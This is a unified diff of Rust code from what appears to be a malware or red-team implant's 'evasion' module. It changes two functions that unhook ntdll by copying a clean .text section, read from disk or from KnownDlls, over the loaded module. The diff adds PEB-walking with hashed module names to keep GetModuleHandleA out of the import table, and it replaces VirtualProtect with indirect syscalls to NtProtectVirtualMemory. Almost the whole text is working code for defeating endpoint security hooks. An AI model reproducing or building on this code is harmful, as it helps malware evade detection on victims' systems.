@@ -1,18 +1,25 @@
-#[cfg(target_os = "windows")]
-use windows_sys::Win32::System::{
-    LibraryLoader::GetModuleHandleA,
-    Memory::{VirtualProtect, PAGE_EXECUTE_READWRITE},
-};
+/// Resolve ntdll base via PEB on x64 (no GetModuleHandleA in IAT).
+#[cfg(all(target_os = "windows", target_arch = "x86_64"))]
+unsafe fn resolve_ntdll_base() -> *mut u8 {
+    use crate::resolve::api_hash::{djb2_hash_lower, peb_get_module_base};
+    const NTDLL_H: u32 = djb2_hash_lower(b"ntdll.dll");
+    peb_get_module_base(NTDLL_H) as *mut u8
+}
+
+#[cfg(all(target_os = "windows", not(target_arch = "x86_64")))]
+unsafe fn resolve_ntdll_base() -> *mut u8 {
+    windows_sys::Win32::System::LibraryLoader::GetModuleHandleA(b"ntdll.dll\0".as_ptr()) as *mut u8
+}
 
 #[cfg(target_os = "windows")]
 pub unsafe fn unhook_ntdll_disk() -> bool {
     use windows_sys::Win32::Storage::FileSystem::{
-        CreateFileA, ReadFile, OPEN_EXISTING, FILE_SHARE_READ,
-        FILE_ATTRIBUTE_NORMAL,
+        CreateFileA, ReadFile, OPEN_EXISTING, FILE_SHARE_READ, FILE_ATTRIBUTE_NORMAL,
     };
     use windows_sys::Win32::Foundation::{INVALID_HANDLE_VALUE, CloseHandle, GENERIC_READ};
+    use crate::evasion::syscalls::{get_ssn, indirect_syscall};
 
-    let ntdll_base = GetModuleHandleA(b"ntdll.dll\0".as_ptr()) as *mut u8;
+    let ntdll_base = resolve_ntdll_base();
     if ntdll_base.is_null() { return false; }
 
     let path = b"C:\\Windows\\System32\\ntdll.dll\0";
@@ -32,20 +39,31 @@ pub unsafe fn unhook_ntdll_disk() -> bool {
     if text_size == 0 { return false; }
 
     let target = ntdll_base.add(text_rva);
-    let mut old_protect = 0u32;
-    VirtualProtect(target as _, text_size, PAGE_EXECUTE_READWRITE, &mut old_protect);
-    core::ptr::copy_nonoverlapping(disk_ntdll.add(text_rva), target, text_size);
-    VirtualProtect(target as _, text_size, old_protect, &mut old_protect);
+    let ph = usize::MAX; // -1 = current process
+
+    if let Some((prot_ssn, prot_tramp)) = get_ssn(b"NtProtectVirtualMemory") {
+        let mut base = target as usize; let mut sz = text_size; let mut old = 0u32;
+        indirect_syscall(prot_ssn, prot_tramp, ph,
+            &mut base as *mut usize as usize, &mut sz as *mut usize as usize,
+            0x40, &mut old as *mut u32 as usize, 0); // PAGE_EXECUTE_READWRITE
+        core::ptr::copy_nonoverlapping(disk_ntdll.add(text_rva), target, text_size);
+        let mut base2 = target as usize; let mut sz2 = text_size;
+        indirect_syscall(prot_ssn, prot_tramp, ph,
+            &mut base2 as *mut usize as usize, &mut sz2 as *mut usize as usize,
+            old as usize, &mut old as *mut u32 as usize, 0);
+    } else {
+        core::ptr::copy_nonoverlapping(disk_ntdll.add(text_rva), target, text_size);
+    }
     true
 }
 
 #[cfg(target_os = "windows")]
 pub(crate) unsafe fn get_text_section(base: *const u8) -> (usize, usize) {
-    let e_lfanew   = *(base.add(0x3C) as *const u32) as usize;
-    let nt         = base.add(e_lfanew);
+    let e_lfanew     = *(base.add(0x3C) as *const u32) as usize;
+    let nt           = base.add(e_lfanew);
     let num_sections = *(nt.add(0x06) as *const u16) as usize;
     let opt_size     = *(nt.add(0x14) as *const u16) as usize;
-    let sections   = nt.add(0x18 + opt_size) as *const [u8; 40];
+    let sections     = nt.add(0x18 + opt_size) as *const [u8; 40];
     for i in 0..num_sections {
         let sec = &*sections.add(i);
         if &sec[0..5] == b".text" {
@@ -62,7 +80,7 @@ pub unsafe fn unhook_ntdll_knowndlls() -> bool {
     use crate::evasion::syscalls::{get_ssn, indirect_syscall, indirect_syscall_10};
     use windows_sys::Win32::Foundation::CloseHandle;
 
-    let ntdll_base = GetModuleHandleA(b"ntdll.dll\0".as_ptr()) as *mut u8;
+    let ntdll_base = resolve_ntdll_base();
     if ntdll_base.is_null() { return false; }
 
     let name_buf: [u16; 20] = [
@@ -87,12 +105,7 @@ pub unsafe fn unhook_ntdll_knowndlls() -> bool {
         security_qos:  usize,
     }
 
-    let us = UnicodeString {
-        length:     40,
-        max_length: 40,
-        _pad:       0,
-        buffer:     name_buf.as_ptr(),
-    };
+    let us = UnicodeString { length: 40, max_length: 40, _pad: 0, buffer: name_buf.as_ptr() };
     let oa = ObjectAttributes {
         length:        core::mem::size_of::<ObjectAttributes>() as u32,
         root_dir:      0,
@@ -121,16 +134,11 @@ pub unsafe fn unhook_ntdll_knowndlls() -> bool {
     let mut view_size: usize = 0;
     let map_status = indirect_syscall_10(
         map_ssn, map_tramp,
-        section_handle,
-        usize::MAX,
+        section_handle, usize::MAX,
         &mut base_address as *mut usize as usize,
-        0,
-        0,
-        0,
+        0, 0, 0,
         &mut view_size as *mut usize as usize,
-        2,
-        0,
-        0x02,
+        2, 0, 0x02,
     );
     if map_status != 0 || base_address == 0 {
         CloseHandle(section_handle as _); return false;
@@ -140,14 +148,23 @@ pub unsafe fn unhook_ntdll_knowndlls() -> bool {
     let (text_rva, text_size) = get_text_section(mapped);
     if text_size > 0 {
         let target = ntdll_base.add(text_rva);
-        let mut old_protect = 0u32;
-        VirtualProtect(target as _, text_size, PAGE_EXECUTE_READWRITE, &mut old_protect);
-        core::ptr::copy_nonoverlapping(mapped.add(text_rva), target, text_size);
-        VirtualProtect(target as _, text_size, old_protect, &mut old_protect);
+        let ph = usize::MAX;
+        if let Some((prot_ssn, prot_tramp)) = get_ssn(b"NtProtectVirtualMemory") {
+            let mut base = target as usize; let mut sz = text_size; let mut old = 0u32;
+            indirect_syscall(prot_ssn, prot_tramp, ph,
+                &mut base as *mut usize as usize, &mut sz as *mut usize as usize,
+                0x40, &mut old as *mut u32 as usize, 0); // PAGE_EXECUTE_READWRITE
+            core::ptr::copy_nonoverlapping(mapped.add(text_rva), target, text_size);
+            let mut base2 = target as usize; let mut sz2 = text_size;
+            indirect_syscall(prot_ssn, prot_tramp, ph,
+                &mut base2 as *mut usize as usize, &mut sz2 as *mut usize as usize,
+                old as usize, &mut old as *mut u32 as usize, 0);
+        } else {
+            core::ptr::copy_nonoverlapping(mapped.add(text_rva), target, text_size);
+        }
     }
 
-    let unmap_result = get_ssn(b"NtUnmapViewOfSection");
-    if let Some((unmap_ssn, unmap_tramp)) = unmap_result {
+    if let Some((unmap_ssn, unmap_tramp)) = get_ssn(b"NtUnmapViewOfSection") {
         indirect_syscall(unmap_ssn, unmap_tramp, usize::MAX, base_address, 0, 0, 0, 0);
     }
     CloseHandle(section_handle as _);
